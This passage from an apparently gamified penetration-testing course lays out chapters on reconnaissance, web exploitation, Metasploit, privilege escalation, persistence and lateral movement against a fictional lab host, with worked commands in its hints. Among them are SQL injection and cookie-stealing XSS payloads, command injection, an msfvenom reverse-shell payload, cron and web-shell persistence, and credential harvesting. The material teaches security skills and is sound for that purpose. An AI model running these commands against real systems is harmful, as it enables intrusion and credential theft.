    nar:"You've mapped the inside. Now look outward. Before you can attack a network you must know your own position in it — your address, your routes, who your neighbours are. Orientation comes before aggression.",
    goal:"Find your own IP address, your routing table, and the neighbours your machine already knows about.",
    labels:{ ipAddr:"Find your own network address", ipRoute:"Find how traffic leaves this machine", arpA:"List the neighbours on your local segment" },
    hints:["Your address, your routes out, and your local neighbours — three views of your position.","ip addr shows interfaces; ip route shows the gateway; arp -a lists known neighbours.","ip addr — ip route — arp -a"],
    learned:"ip addr shows your interfaces and IPs; ip route shows your default gateway (the door to other networks); arp -a lists machines your host has already spoken to on the local segment — instant targets. Knowing your subnet and gateway tells you what you can reach and where to pivot. You can't attack a network you haven't located yourself within.",
    msg:"You're on 10.0.0.0/24, gateway .1, and a host .10 is already in your ARP table.\nThat .10 is the target V was working. It's where the trail leads." },
  "4.2": {
    nar:"Everything on the wire rides on TCP/IP. Understand the three-way handshake and you understand why scans work, why firewalls behave as they do, and how to talk to a port by hand with nothing but netcat.",
    goal:"Read the notes on how TCP connections form, and open a raw listener you could catch a connection on.",
    labels:{ tcpNotes:"Study how a TCP connection is established", ncListen:"Open a raw TCP listener" },
    hints:["First understand the handshake from the notes, then open a port to listen on yourself.","There's a tcp_notes file to read; nc -lvnp PORT opens a listener.","cat tcp_notes.txt — nc -lvnp 4444"],
    learned:"TCP connects with a three-way handshake: SYN, SYN-ACK, ACK. Scanners exploit it (a half-open SYN scan never completes the handshake, which is stealthier); firewalls filter on it. netcat (nc -lvnp) opens a raw listener — the catcher for reverse shells and the swiss-army knife of the network. Understanding the handshake is understanding the foundation everything else stands on.",
    msg:"The handshake makes sense now. You opened a listener — the same kind of port that catches a reverse shell.\nThat's exactly how V planned to receive the escape signal." },
  "4.3": {
    nar:"DNS is the internet's phone book — and a chronically leaky one. Query the right records and a misconfigured server will hand you its entire internal map through a zone transfer. Names are intelligence.",
    goal:"Look up an address record, look up a mail record, and attempt a full zone transfer.",
    labels:{ digA:"Resolve a domain's address record", digMX:"Resolve a domain's mail records", digAXFR:"Attempt a full DNS zone transfer" },
    hints:["A normal lookup, a mail-server lookup, and the big one — asking a server for its whole zone.","dig DOMAIN A and dig DOMAIN MX do lookups; dig axfr @nameserver domain attempts a transfer.","dig google.com A — dig google.com MX — dig axfr @ns1.target.machine target.machine"],
    learned:"dig queries DNS records: A (address), MX (mail), and many more. A zone transfer (AXFR) is meant only for backup name servers — but a misconfigured server will dump every record to anyone who asks, handing you every subdomain (admin, vpn, dev, internal) in one shot. DNS enumeration is often the richest, quietest recon you'll do.",
    msg:"The zone transfer succeeded. admin, dev, vpn, backup, internal — the whole internal map, from one misconfigured server.\nV's notes circled 'internal'. That's where the real machine lives." },
  "4.4": {
    nar:"The web speaks HTTP, and curl speaks it fluently and without a browser's politeness. Headers reveal the server's software; robots.txt cheerfully lists the very paths the admin wanted hidden. Ask the server directly.",
    goal:"Fetch a page, read just its headers, and check robots.txt for paths the admin tried to hide.",
    labels:{ curlGet:"Fetch a web page's body", curlHead:"Fetch only a page's HTTP headers", curlRobo:"Check robots.txt for hidden paths" },
    hints:["The page itself, just the headers, and the file that lists 'please don't look here' — three requests.","curl URL fetches; curl -I URL gets headers only; request /robots.txt for disallowed paths.","curl http://10.0.0.10/ — curl -I http://10.0.0.10/ — curl http://10.0.0.10/robots.txt"],
    learned:"curl is HTTP without a browser — scriptable, header-readable, perfect for recon. curl -I shows response headers (Server:, X-Powered-By: — instant tech fingerprinting). robots.txt is meant to steer search engines but in practice it's a signposted list of the admin/backup/private paths someone wanted hidden — one of the first files every web attacker reads.",
    msg:"robots.txt disallows /admin and /backup — which is to say, it points straight at them.\nV's web notes start there. The application on .10 is the way in." },
  "4.5": {
    nar:"Sometimes you need to see the raw packets — to confirm a connection, pull a plaintext credential off the wire, or save traffic for later. tcpdump is the wiretap. Capture, save, replay.",
    goal:"Capture live traffic, save a capture to a file, and read that capture back.",
    labels:{ tcpBasic:"Capture live network traffic", tcpWrite:"Save a capture to a file", tcpRead:"Read a saved capture back" },
    hints:["Watch packets live, write them to a file, then read the file — three tcpdump modes.","tcpdump -i IFACE -n captures; -w FILE saves; -r FILE reads back.","tcpdump -i eth0 -n — tcpdump -i eth0 -w capture.pcap — tcpdump -r capture.pcap"],
    learned:"tcpdump captures packets off an interface (-i), resolves nothing with -n for speed, writes pcap with -w and replays with -r. On an unencrypted protocol, a capture hands you credentials in cleartext; even on encrypted traffic, metadata (who talks to whom, when) is intelligence. This is the same engine Wireshark wraps in a GUI — the wiretap underneath all packet analysis.",
    msg:"You can read the wire now. A saved capture is evidence — and sometimes a password in plaintext.\nV captured something on .10 and hid the pcap. You'll find it." },

  // ───────────────────────── CHAPTER 5 ─────────────────────────
  "5.1": {
    nar:"Real attacks start silent. Before you touch the target you learn everything the world already knows about it — registration data, certificates, indexed pages. Passive recon leaves no footprint and often hands you the keys.",
    goal:"Pull registration data, read the target's TLS certificate, and review the dorking notes for indexed exposures.",
    labels:{ whois:"Look up domain registration data", openssl:"Inspect the target's TLS certificate", googDork:"Study search-engine dorking techniques" },
    hints:["Registration info, the certificate, and search-engine tricks — three passive sources.","whois DOMAIN for registration; openssl s_client -connect HOST:443 for the cert; read the dorking notes.","whois target.machine — openssl s_client -connect 10.0.0.10:443 — cat google_dorking.txt"],
    learned:"Passive recon never touches the target directly: whois reveals registrant and infrastructure detail; a TLS certificate leaks hostnames and internal names in its SAN field; Google dorks (site:, filetype:, inurl:) surface documents and panels the target accidentally indexed. The quietest recon is often the most productive — and it's invisible to the defender.",
    msg:"The certificate's SAN field lists internal hostnames the admin never meant to expose.\nV built their whole map from passive sources first. Loud comes later." },
  "5.2": {
    nar:"DNS deserves its own pass. Beyond a single zone transfer, you enumerate every subdomain you can — by transfer, by brute force, by automation. Each name is another foothold the defender forgot about.",
    goal:"Run automated DNS enumeration, and brute-force subdomains with a loop of your own.",
    labels:{ dnsrecon:"Run automated DNS enumeration", subBrute:"Brute-force subdomains using a loop" },
    hints:["One automated tool, and one loop you write yourself to guess names.","dnsrecon -d DOMAIN automates it; a for loop over candidate names with dig brute-forces.","dnsrecon -d target.machine — for sub in admin mail vpn; do dig $sub.target.machine; done"],
    learned:"dnsrecon automates record-pulling and transfers; but the loop you wrote is the real lesson — subdomain brute-forcing is just iterating candidate names and asking DNS if they resolve. Forgotten subdomains (dev, staging, old-vpn) are perennial soft targets because nobody patches what nobody remembers. You turned the control flow from Chapter 2 into a recon weapon.",
    msg:"A staging subdomain answered that the admins forgot existed. Forgotten things are unguarded things.\nV's notes: 'the way in was never the front door.'" },
  "5.3": {
    nar:"People are the softest target. OSINT harvests emails, names, and the metadata hiding inside published documents and photos — the username baked into a PDF, the GPS in a JPEG. The org tells you its own secrets if you read carefully.",
    goal:"Harvest emails and names for the target, pull metadata out of a published photo, and review the methodology notes.",
    labels:{ harvest:"Harvest emails and names for the target", exiftool1:"Extract hidden metadata from a file", method:"Review the recon methodology notes" },
    hints:["Gather people-data, strip metadata from a file, and read the method notes — three OSINT moves.","theHarvester gathers emails/names; exiftool reads embedded metadata; read methodology.txt.","theHarvester -d target.machine -b google — exiftool employee_photo.jpg — cat methodology.txt"],
    learned:"OSINT mines public data: theHarvester scrapes emails and hostnames; exiftool reads metadata embedded in files — author usernames in documents, software versions, even GPS coordinates in photos. Harvested email formats become login guesses; leaked usernames seed password sprays. The target publishes its own attack surface, and almost no one scrubs metadata before posting.",
    msg:"The photo's metadata leaked the photographer's username — and it matches an account format on the box.\nV built a username list this exact way. Names become logins become access." },
  "5.4": {
    nar:"Now you make noise — carefully. Active recon touches the network: who's alive, what ports answer, what a service announces about itself when you knock. The art is learning the most while triggering the least.",
    goal:"Sweep the local network for live hosts your own way, scan a host's neighbours, and grab a service banner.",
    labels:{ arpScan:"Discover live hosts on the local network", pingSweep:"Sweep for live hosts using a loop", banner:"Grab a service's identifying banner" },
    hints:["A layer-2 host discovery, a ping sweep you script, and a banner grab — three active probes.","arp-scan --localnet finds hosts; a for loop of pings sweeps; nc -v HOST PORT grabs a banner.","arp-scan --localnet — for i in $(seq 1 20); do ping -c1 -W1 10.0.0.$i &>/dev/null && echo $i; done — nc -v 10.0.0.10 22"],
    learned:"Active recon probes directly: arp-scan finds hosts at layer 2 (impossible to firewall on a LAN); a ping sweep loop finds live IPs; banner grabbing with netcat makes a service announce its software and version — which you feed straight into vulnerability research. The skill is calibration: enough probing to map the target, little enough to stay under the alert threshold.",
    msg:"Port 22 on .10 announced its SSH version on contact. A version is a CVE waiting to be looked up.\nV's banner notes are meticulous. Loud, but precise." },
  "5.5": {
    nar:"Findings you don't record are findings you'll lose. Every serious operator keeps a structured workspace from minute one — it's how a chaotic engagement becomes a report, and how you ever find that one note again at 3am.",
    goal:"Build a workspace directory and start a target notes file inside it.",
    labels:{ workspace:"Create and enter a dedicated workspace", targetFile:"Start a structured target notes file" },
    hints:["Make a place to work, move into it, and start writing findings down.","mkdir a workspace and cd into it; echo your first finding into a notes file.","mkdir workspace && cd workspace — echo '[target]' > notes.txt"],
    learned:"Documentation discipline separates professionals from script-runners: a per-target workspace, a notes file capturing every host/port/cred/finding with timestamps, screenshots of proof. It's not bureaucracy — it's how you avoid re-scanning, how you write the report, and (on real engagements) how you prove what you did and when if anyone ever asks. Recon ends where organisation begins.",
    msg:"Your workspace is open and your first findings are written down.\nV's own workspace is somewhere on this box — find it and you inherit their entire investigation." },

  // ───────────────────────── CHAPTER 6 ─────────────────────────
  "6.1": {
    nar:"Recon gave you the shape. Nmap fills in every detail — which ports are open, what service and version sits behind each, what the OS is. It is the single most important reconnaissance tool you will ever use. Learn its core scans cold.",
    goal:"Run a basic scan, then add version detection, then default scripts, then an aggressive all-in-one scan.",
    labels:{ nmapBasic:"Run a basic port scan", nmapSV:"Detect service versions", nmapSC:"Run nmap's default safe scripts", nmapA:"Run an aggressive combined scan" },
    hints:["A plain scan, then version detection, then scripts, then everything at once — escalating depth.","nmap HOST is basic; -sV adds versions; -sC adds default scripts; -A combines them.","nmap 10.0.0.10 — nmap -sV 10.0.0.10 — nmap -sC 10.0.0.10 — nmap -A 10.0.0.10"],
    learned:"Nmap maps a target: a bare scan finds open ports; -sV fingerprints exact service versions (the link to known CVEs); -sC runs safe default NSE scripts that pull extra detail; -A bundles version, scripts, OS detection and traceroute. Version numbers are the bridge from 'a port is open' to 'this exact software has this exact exploit'. Every engagement starts here.",
    msg:"The scan is back: open ports, exact versions, one of them old enough to have a public exploit.\nV's scan results match yours almost exactly. You're walking their footsteps now." },
  "6.2": {
    nar:"Nmap is a scanning engine with hundreds of scripts bolted on — the NSE. The right script checks for known vulns, enumerates a web app, or maps SMB shares automatically. It's recon and vuln-scanning fused into one.",
    goal:"Run the vulnerability scripts, enumerate the web server, and enumerate SMB shares.",
    labels:{ nmapVuln:"Scan for known vulnerabilities", nmapHttp:"Enumerate the web server with scripts", nmapSmb:"Enumerate SMB shares with scripts" },
    hints:["A vuln check, a web enumeration, and an SMB share enumeration — three NSE categories.","--script=vuln checks vulns; --script=http-enum enumerates web; --script=smb-enum-shares maps shares.","nmap --script=vuln 10.0.0.10 — nmap --script=http-enum 10.0.0.10 -p80 — nmap --script=smb-enum-shares 10.0.0.10"],
    learned:"The Nmap Scripting Engine (NSE) automates deep checks: the vuln category flags known CVEs; http-enum finds web paths; smb-enum-shares lists network shares (a classic source of exposed files and creds). One scan can replace a dozen manual tools. The trade-off is noise — scripts are loud — so you choose categories deliberately rather than firing everything.",
    msg:"The vuln scripts flagged a known CVE on an exposed service, and SMB is sharing a folder it shouldn't.\nV's notes name that same share. The trail tightens." },
  "6.3": {
    nar:"Open ports are invitations. Service enumeration accepts them — FTP that allows anonymous login, SNMP answering to 'public', SMB spilling users and shares. The detail you pull here is what makes the exploit later trivial.",
    goal:"Enumerate FTP for anonymous access, walk SNMP with the default community string, and fully enumerate SMB.",
    labels:{ ftpEnum:"Test FTP for anonymous access", snmpEnum:"Walk SNMP with the default community", enum4l:"Fully enumerate the SMB service" },
    hints:["FTP anonymous login, SNMP with the default string, and a full SMB enum — three services.","ftp HOST then try 'anonymous'; snmpwalk -v1 -c public HOST; enum4linux -a HOST.","ftp 10.0.0.10 — snmpwalk -v1 -c public 10.0.0.10 — enum4linux -a 10.0.0.10"],
    learned:"Each service leaks differently: anonymous FTP hands out files to anyone; SNMP with the default 'public' community string dumps system inventory, running processes, even ARP tables; enum4linux extracts users, shares and password policy from SMB. Default credentials and community strings are everywhere because someone never changed them. Enumeration is patient, unglamorous, and where engagements are actually won.",
    msg:"Anonymous FTP let you in, and SMB enumeration listed every user account on the box.\nA full username list. Exactly what V assembled before they went quiet." },
  "6.4": {
    nar:"Web servers hide most of their surface behind unlinked paths. Directory brute-forcing knocks on thousands of likely doors; vulnerability scanners and fingerprinters tell you what the application is built from. You map what the browser never shows.",
    goal:"Brute-force hidden directories, run a web vulnerability scan, and fingerprint the web stack.",
    labels:{ gobust:"Brute-force hidden web directories", nikto:"Scan the web server for known issues", whatweb:"Fingerprint the web technology stack" },
    hints:["Discover hidden paths, scan for known web flaws, and fingerprint the stack — three web tools.","gobuster dir busts directories; nikto scans for issues; whatweb fingerprints tech.","gobuster dir -u http://10.0.0.10/ -w /usr/share/wordlists/dirb/common.txt — nikto -h http://10.0.0.10/ — whatweb http://10.0.0.10/"],
    learned:"gobuster (or dirb/ffuf) brute-forces paths against a wordlist, finding /admin, /backup, /api that no link points to; nikto flags known misconfigurations and dangerous files; whatweb fingerprints the CMS, framework and server. Web attacks live or die on enumeration — the vulnerable endpoint is almost always one nobody linked to and the scanner found.",
    msg:"The directory bust found an admin panel and a forgotten backup file. The fingerprint named the framework — and its version has a public exploit.\nV's path went straight through that panel." },
  "6.5": {
    nar:"You have versions; now find the matching exploit. searchsploit is an offline database of public exploits — search by software and version, copy the code, and you're holding the key that fits the lock you found.",
    goal:"Search the exploit database for the target's software, and copy a matching exploit out to work on.",
    labels:{ srchspl:"Search the exploit database by software", srchCopy:"Copy a matching exploit locally" },
    hints:["Search for an exploit matching the version, then pull a copy to your workspace.","searchsploit SOFTWARE VERSION searches; searchsploit -m ID copies it out.","searchsploit Apache 2.4 — searchsploit -m 50383"],
    learned:"searchsploit is a local mirror of Exploit-DB — search by product and version offline, then -m to copy an exploit into your working directory to read and adapt. The workflow is the whole point: enumerate exact versions, search for matching public exploits, verify and adapt before firing. Most 'hacking' is disciplined matching of a known flaw to a confirmed version.",
    msg:"You found a public exploit matching the exact version on .10 and copied it to your workspace.\nV did the same — their copy is still here, annotated. You're about to use their work." },
  // ───────────────────────── CHAPTER 7 ─────────────────────────
  "7.1": {
    nar:"The application on .10 talks to a database, and it trusts what users type. SQL injection is what happens when input becomes code. Break the query by hand to prove it, then let a tool weaponise it.",
    goal:"Prove the login is injectable by hand, then automate exploitation to dump the database.",
    labels:{ sqliManual:"Bypass the login by breaking its SQL query", sqlmap:"Automate SQL injection to dump data" },
    hints:["First break the query manually with a crafted input, then let an automated tool take over.","A classic auth bypass comments out the password check; sqlmap automates dumping.","Try admin'-- as the username, then: sqlmap -u 'http://10.0.0.10/login' --dbs"],
    learned:"SQL injection happens when user input is concatenated into a query instead of parameterised. admin'-- closes the username string and comments out the rest, bypassing the password check entirely. sqlmap automates detection and dumping once you've confirmed the flaw by hand. The fix is always the same: parameterised queries / prepared statements. Never trust input as code.",
    msg:"The login fell to a quote and two dashes, and the database dumped its tables.\nOne of them holds hashes. V's notes: 'the DB is where the keys are kept.'" },
  "7.2": {
    nar:"If SQLi turns input into database code, XSS turns input into browser code. Reflected, stored, and cookie-stealing — three flavours of making someone else's browser run your script. The danger scales with where the payload lands.",
    goal:"Demonstrate a reflected payload, a stored payload, and one that steals a session cookie.",
    labels:{ xssRefl:"Demonstrate a reflected script payload", xssStore:"Plant a stored script payload", xssCookie:"Craft a cookie-stealing payload" },
    hints:["Reflected (bounces back in the response), stored (saved server-side), and cookie theft — three payloads.","The same script payload becomes STORED when you put it in something that gets saved — a comment, a message, a post.","Reflected: <script>alert(1)</script>  •  Stored: post the payload into a comment field, e.g. comment=<script>alert(1)</script>  •  Theft: a payload using document.cookie"],
    learned:"Cross-site scripting injects script into pages other users load. Reflected XSS bounces a payload straight back in the response (needs a lure); stored XSS saves it server-side so it hits everyone who views the page (far worse); cookie theft via document.cookie hijacks sessions outright. The defence is output encoding and a Content-Security-Policy. XSS is about whose browser runs your code, and where it persists.",
    msg:"Stored XSS means everyone who loads that page runs your script — including, eventually, an admin.\nV used a stored payload to capture the admin's session. Their notes describe the exact field." },
  "7.3": {
    nar:"When a web app builds file paths from user input, you can often climb out of where it expects you and read anything the server can — including files no web page should ever expose. Path traversal is trust in a filename, abused.",
    goal:"Read a file outside the web root via traversal, and use the technique to reach a sensitive system file.",
    labels:{ lfiBasic:"Read a file outside the web root", lfiShadow:"Reach a sensitive system file via inclusion" },
    hints:["Climb out of the web directory with ../, then aim that at something sensitive.","../ sequences walk up the tree; point them at a known system file.","?file=../../../../etc/passwd then aim deeper at /etc/shadow"],
    learned:"Local File Inclusion / path traversal abuses code that builds a path from input: ../ sequences escape the intended directory and read arbitrary files (/etc/passwd, config files with DB creds, even logs you can poison into code execution). The fix is to never build filesystem paths from user input, and to canonicalise and whitelist. A filename is input — and input is never trustworthy.",
    msg:"Traversal walked you out of the web root and into the system's own files.\nV reached the credential store this way. The technique that reads /etc/passwd reads anything." },
  "7.4": {
    nar:"The worst input flaw of all: when user input reaches the system shell. Command injection turns a web form into a terminal on the server. Confirm it with a chained command, then upgrade it into a real shell.",
    goal:"Confirm command injection by chaining a command, then turn it into an interactive shell.",
    labels:{ cmdInj:"Confirm injection by chaining a command", cmdShell:"Escalate injection into a real shell" },
    hints:["First prove your input runs as a command, then use it to spawn a shell back to you.","Shell metacharacters like ; chain a second command onto the first. Send the injection to the vulnerable endpoint and ask it to run id.","Confirm with: curl http://10.0.0.10/ping.php -d 'ip=127.0.0.1; id'  — then escalate to a reverse shell"],
    learned:"Command injection occurs when input reaches a system shell call; metacharacters (; && | $()) chain your own commands onto the intended one. ; id confirms execution; from there a reverse shell gives interactive control. It's often the fastest path from web flaw to full host compromise. The fix: never pass input to a shell — use parameterised APIs and strict allow-lists.",
    msg:"; id returned root's id — the web service runs as root, and now so do you on it.\nV's reverse shell landed here. This is the foothold the whole engagement turned on." },
  "7.5": {
    nar:"Sometimes there's no clever bug — just a weak password or a default no one changed. Online brute-forcing and default-credential checks are unglamorous and devastatingly effective. Try the obvious before the elaborate.",
    goal:"Brute-force a login against a wordlist, and test for default credentials.",
    labels:{ hydra:"Brute-force a login with a wordlist", defCreds:"Test for default credentials" },
    hints:["Throw a wordlist at the login, and separately just try the obvious factory defaults.","hydra automates credential guessing; default creds are things like admin/admin.","hydra -l admin -P rockyou.txt 10.0.0.10 http-post-form ... — then try admin/admin"],
    learned:"hydra automates online password guessing against a service and a wordlist (rockyou.txt being the canonical one); default-credential checks just try the factory pairs (admin/admin, root/toor). Rate-limiting and lockouts are the defence, plus simply changing defaults. It's not elegant, but weak and default credentials remain one of the most common real-world breaches — always try the obvious first.",
    msg:"A weak password fell to the wordlist. No exploit, no cleverness — just a password someone never strengthened.\nV's notes are blunt about it: 'the front door was unlocked the whole time.'" },
  "7.6": {
    nar:"Modern apps add modern flaws. SSRF makes the server fetch URLs for you — including internal ones you can't reach. JWTs carry trust in a token you can sometimes forge. Newer surface, same root cause: misplaced trust.",
    goal:"Make the server make a request on your behalf, reach an internal-only endpoint through it, and decode a session token.",
    labels:{ ssrf:"Make the server fetch a URL for you", ssrfMeta:"Reach an internal-only endpoint via SSRF", jwtDecode:"Decode a JSON Web Token" },
    hints:["Force the server to fetch a URL, point that at something internal, and separately decode a token.","SSRF abuses a URL parameter; point it at internal addresses; a JWT is base64 you can decode.","Set a url= param to an internal address / cloud metadata IP, then base64-decode the JWT's middle section"],
    learned:"SSRF (Server-Side Request Forgery) tricks the server into making requests you can't — reaching internal services and cloud metadata endpoints (the classic 169.254.169.254 credential leak). JWTs are base64-encoded claims; the header and payload aren't encrypted, only signed — decode them freely, and weak or 'none' signature handling lets you forge them. Both are failures of trust boundaries in modern stacks.",
    msg:"SSRF reached an internal endpoint the firewall thought was unreachable, and the JWT decoded to reveal its claims.\nThat internal endpoint is part of V's escape route. The pieces are connecting." },

  // ───────────────────────── CHAPTER 8 ─────────────────────────
  "8.1": {
    nar:"Metasploit is the industrial framework — a searchable arsenal of exploits and payloads wired into one console. Learn its loop: search, select, configure, fire. It's the backbone of countless real engagements.",
    goal:"Start the framework, search for a module, configure it, and run it.",
    labels:{ msfStart:"Launch the Metasploit console", msfSearch:"Search for an exploit module", msfSet:"Configure the module's options", msfRun:"Launch the configured exploit" },
    hints:["Start the console, search the arsenal, set your options, then fire — the core msfconsole loop.","msfconsole starts it; search finds modules; set configures; exploit runs.","msfconsole — search type:exploit — set RHOSTS 10.0.0.10 — exploit"],
    learned:"Metasploit's workflow is universal: msfconsole to start, search to find a module, use to select, set for options (RHOSTS, LHOST, payload), then exploit/run. It standardises the exploit-to-payload-to-session pipeline so you focus on the engagement, not the plumbing. Knowing the loop matters more than memorising modules — every module follows the same shape.",
    msg:"The framework is live and a module is set against .10.\nV's msfconsole history is still on disk. They knew exactly which module to reach for." },
  "8.2": {
    nar:"A successful exploit can give you Meterpreter — an advanced payload that lives in memory and turns the session into a remote control. Survey the host, confirm your privileges, climb to SYSTEM, and lift the password hashes.",
    goal:"Survey the compromised host, confirm your user, attempt to elevate, and dump the password hashes.",
    labels:{ sysinfo:"Survey the compromised host", getuid:"Confirm your current privileges", getsys:"Attempt to elevate to SYSTEM", hashdump:"Dump the password hashes" },
    hints:["Survey, check who you are, try to elevate, then dump hashes — the post-exploitation survey.","sysinfo profiles the host; getuid shows your context; getsystem elevates; hashdump lifts hashes.","sysinfo — getuid — getsystem — hashdump"],
    learned:"Meterpreter is an in-memory post-exploitation payload: sysinfo profiles the host, getuid shows your privilege context, getsystem attempts automatic elevation, and hashdump extracts password hashes for offline cracking and pass-the-hash. Living in memory makes it stealthier than dropping binaries. This is the survey-and-harvest phase — you've got a session, now you learn the host and gather everything reusable.",
    msg:"Hashes dumped. They go in your workspace next to the ones the database leaked.\nV collected hashes obsessively. You're starting to see why — they're keys to other doors." },
  "8.3": {
    nar:"You can't always use a framework session — sometimes you must hand-craft the payload and deliver it yourself. msfvenom builds standalone payloads for any target and format. Know how to list the options and generate one.",
    goal:"List available payloads, and generate a standalone payload for a target platform.",
    labels:{ msfvList:"List the available payloads", msfvLinux:"Generate a standalone payload" },
    hints:["First see what payloads exist, then generate one for a specific platform and format.","msfvenom --list payloads lists them; -p PAYLOAD LHOST=.. -f FORMAT builds one.","msfvenom --list payloads — msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f elf"],
    learned:"msfvenom generates standalone payloads outside the console: choose a payload (-p), set callback details (LHOST/LPORT), pick a format (-f elf/exe/raw/python). You use it when you're delivering the payload through your own exploit, a file upload, or a phishing lure rather than a Metasploit module. Pair it with a matching listener to catch the shell. It's the payload factory behind everything.",
    msg:"You built a payload by hand and a listener to catch it.\nV preferred hand-built payloads — quieter, and they bypass the signatures the framework's defaults trip." },
  "8.4": {
    nar:"Frameworks fail; public exploits don't always work out of the box. Manual exploitation is finding the code, reading it, fixing its target details, and running it yourself. This is the skill that separates operators from button-pushers.",
    goal:"Find a matching public exploit, copy it locally, and run it against the target after reviewing it.",
    labels:{ srchFind:"Find a matching public exploit", srchCopy2:"Copy the exploit to your workspace", runExpl:"Run the exploit against the target" },
    hints:["Find it, copy it out, read and adjust it, then run it — the manual exploitation chain.","searchsploit finds and -m copies; run the script with the target as an argument.","searchsploit <software> — searchsploit -m <id> — python3 exploit.py 10.0.0.10"],
    learned:"Manual exploitation is the real craft: find a public exploit (searchsploit/Exploit-DB), read it before running it (blindly running exploit code is how you get backdoored or crash the target), adjust hardcoded IPs/ports/offsets, then execute. Always understand what an exploit does first. This is the difference between knowing why something works and merely that a tool said 'success'.",
    msg:"You read the exploit, fixed its target details, and it worked.\nV's annotations in the margins of this exact script taught you what to change. You're collaborating with a ghost." },
  "8.5": {
    nar:"The exploit's reward is a shell — but a raw reverse shell is fragile and dumb. Learn the variants, catch one on a listener, then upgrade it into a stable, interactive TTY. A broken shell that dies on Ctrl-C wins nobody an engagement.",
    goal:"Study the reverse-shell variants, open a listener to catch one, and stabilise the shell once it lands.",
    labels:{ readShells:"Study the reverse-shell variants", ncListen2:"Open a listener to catch a shell", stableShell:"Upgrade the shell to a stable TTY" },
    hints:["Learn the variants, open a catcher, then upgrade the raw shell into a real terminal.","There's a shells reference to read; nc -lvnp catches; a python pty one-liner stabilises.","cat shells.txt — nc -lvnp 4444 — python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"],
    learned:"A reverse shell connects from the target back to your listener (it beats firewalls that block inbound). bash, python, nc and others each have a one-liner. nc -lvnp catches it — but the raw shell has no job control, no tab-completion, and dies on Ctrl-C. The python3 pty.spawn trick (plus stty raw) upgrades it to a real TTY. A stable shell is the difference between a foothold and a frustration.",
    msg:"You caught the shell and turned it into a real terminal.\nThis is the exact technique V used to hold their session on .10. From here, they went for root." },

  // ───────────────────────── CHAPTER 9 ─────────────────────────
  "9.1": {
    nar:"You have a foothold — as a low user. Privilege escalation turns that into root. Re-check sudo, hunt SUID binaries, automate the search, then exploit a known-abusable binary. This is where most of the real game is played.",
    goal:"Re-examine your sudo rights, hunt SUID binaries, run an automated enumerator, and exploit an abusable binary.",
    labels:{ sudoL2:"Re-examine what you may run as root", suidsFind:"Hunt for SUID binaries", linpeas:"Run an automated privesc enumerator", gtfobins2:"Exploit an abusable binary to escalate" },
    hints:["Check sudo again, find SUID binaries, automate the hunt, then abuse one — the privesc loop.","sudo -l, then find -perm -u=s, then linpeas, then look the binary up on GTFOBins.","sudo -l — find / -perm -u=s -type f 2>/dev/null — linpeas.sh — cat gtfobins.txt"],
    learned:"Privilege escalation hunts for misconfigurations: sudo entries you can abuse, SUID binaries that run as root, writable cron scripts, weak file permissions. linpeas automates the whole sweep and colour-codes findings. GTFOBins is the reference — it lists exactly how each common binary (find, vim, less) can be abused to spawn a root shell when it's SUID or sudo-allowed. Find the misconfig, look up the abuse, become root.",
    msg:"A SUID binary on GTFOBins gave you a root shell. You're root on .10 now.\nThis is as far as V's notes on .10 go. Everything past here, they did somewhere else." },
  "9.2": {
    nar:"Root is temporary unless you make it last. Persistence survives reboots and patched bugs: an SSH key you control, a cron job that re-establishes access, a web shell tucked into the app. (Where authorised — persistence is also exactly what defenders hunt for.)",
    goal:"Plant an SSH key for re-entry, establish a cron-based callback, and drop a web shell.",
    labels:{ sshKey:"Plant an SSH key for re-entry", cronBack:"Establish a scheduled callback", webShell:"Drop a web shell in the app" },
    hints:["Three ways back in: a key you own, a scheduled job, and a shell hidden in the web app.","Append your public key to authorized_keys; add a cron job; write a web shell.","echo your public key >> ~/.ssh/authorized_keys — add a crontab callback — drop a web shell in the docroot"],
    learned:"Persistence keeps access through reboots and fixes: an attacker-controlled key in authorized_keys, a cron job that phones home, a web shell in the document root. On the defensive side this section is a hunting checklist — these are precisely the artefacts incident responders look for. Authorised persistence must be documented and removed at engagement end; undocumented persistence is how breaches become long-term compromises.",
    msg:"Three independent ways back in. Lose one, keep the others.\nV planted persistence too — which means there may still be a way they left themselves back into this box. Find it." },
  "9.3": {
    nar:"Root's real prize is everyone else's credentials. The shadow file holds the hashes, shell histories leak typed passwords, and config files across the box hold reused secrets. Harvest them all — credentials are the keys to the next machine.",
    goal:"Read the now-accessible shadow file, mine shell history for credentials, and grep configs for secrets.",
    labels:{ shadowRead:"Read the password hash store", histCreds:"Mine shell history for credentials", grepCreds:"Search configs for reused secrets" },
    hints:["The hash store you couldn't read before, the commands people typed, and secrets in configs — three sources.","As root, cat /etc/shadow; read ~/.bash_history; grep -ri password across config dirs.","cat /etc/shadow — cat ~/.bash_history — grep -ri 'password' /etc /var/www 2>/dev/null"],
    learned:"/etc/shadow holds password hashes (readable only as root — which is why you needed escalation first) for offline cracking. Shell history files capture passwords typed on command lines (a chronic mistake). Config files leak DB and service creds in plaintext. Harvested credentials get reused — people reuse passwords across systems — so the creds from one box are the front-door keys to the next. This is how a single foothold becomes a whole network.",
    msg:"shadow, history, and a config file all gave up credentials — and one of them is reused on an internal host.\nV's history shows them finding this same reused password. It's the thread that leads off this machine entirely." },
  "9.4": {
    nar:"One machine is rarely the goal. Lateral movement uses what you harvested here to reach deeper hosts the firewall thought were safe — SSH with stolen creds, then tunnels and proxies to route your tools through the box you own into the network you don't.",
    goal:"Move to an internal host with harvested credentials, set up a proxy through your foothold, and route tools through it.",
    labels:{ sshLat:"Move to an internal host with stolen creds", socksPrx:"Open a proxy through your foothold", proxychain:"Route tools through the proxy" },
    hints:["Reuse creds to reach a new host, open a tunnel through your foothold, then send tools through it.","ssh with the reused password; ssh -D opens a SOCKS proxy; proxychains routes tools through it.","ssh user@10.0.0.20 — ssh -D 1080 user@foothold — proxychains nmap ..."],
    learned:"Lateral movement pivots deeper: reused credentials open the next host; a SOCKS proxy (ssh -D) through your foothold lets your tools reach the internal network as if you were inside it; proxychains forces any tool down that tunnel. This is how attackers cross from a single exposed box into a whole internal estate — and why network segmentation and unique credentials matter so much to defenders.",
    msg:"You pivoted to an internal host the firewall believed was unreachable from outside.\nThis is the network V disappeared into. The escape route runs through here, not the front door." },
  "9.5": {
    nar:"On authorised engagements you clean up after yourself — and you must understand anti-forensics to detect it as a defender. Clearing history, tampering with logs, altering timestamps: know exactly what an intruder does so you can recognise the traces they miss.",
    goal:"Clear shell history, understand log tampering, and understand timestamp manipulation.",
